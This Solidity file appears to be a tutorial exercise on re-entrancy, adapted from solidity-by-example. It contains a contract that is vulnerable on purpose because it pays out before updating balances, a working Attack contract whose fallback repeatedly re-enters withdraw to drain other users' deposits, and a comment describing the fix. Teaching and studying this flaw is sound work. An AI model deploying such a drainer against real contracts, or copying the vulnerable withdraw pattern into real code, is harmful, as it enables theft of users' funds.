//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

//https://solidity-by-example.org/hacks/re-entrancy/
/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

/**
solution
1.easy
-reset balance to zero
-call ->comes last  
    function withdraw()public {
        uint256 balance =balances[msg.sender];
        require(balance >0,"Balnce should be greater than zero");
          balances[msg.sender] = 0;


        (bool sent,)=msg.sender.call{value:balance}("");

        require(sent,"Failed to send ETH");
       
    }

2.-Mutex lock ->openzepplin
 */
contract ReentrantVulnerable{
    mapping(address=>uint256)public balances;

    function deposit()public payable{
        balances[msg.sender]+= msg.value;
    }
    function withdraw()public {
        uint256 balance =balances[msg.sender];
        require(balance >0,"Balnce should be greater than zero");
        (bool sent,)=msg.sender.call{value:balance}("");

        require(sent,"Failed to send ETH");
         balances[msg.sender] = 0;
    }
    function getBalance()public view returns(uint256){
        return address(this).balance;
    }
}

contract Attack{
    ReentrantVulnerable public reentrantVulnerable;
    constructor(address _reentrantVulnerableAddress){
        reentrantVulnerable=ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    function attack()external payable{
        reentrantVulnerable.deposit{value:1 ether}();
        reentrantVulnerable.withdraw();
    }
    fallback()external payable{
        if(address(reentrantVulnerable).balance >= 1 ether){
            reentrantVulnerable.withdraw();
        }
    }
    /**added to stop warning */
    receive()external payable{ }
    function getBalance()public view returns(uint256){
        return address(this).balance;
    }
}
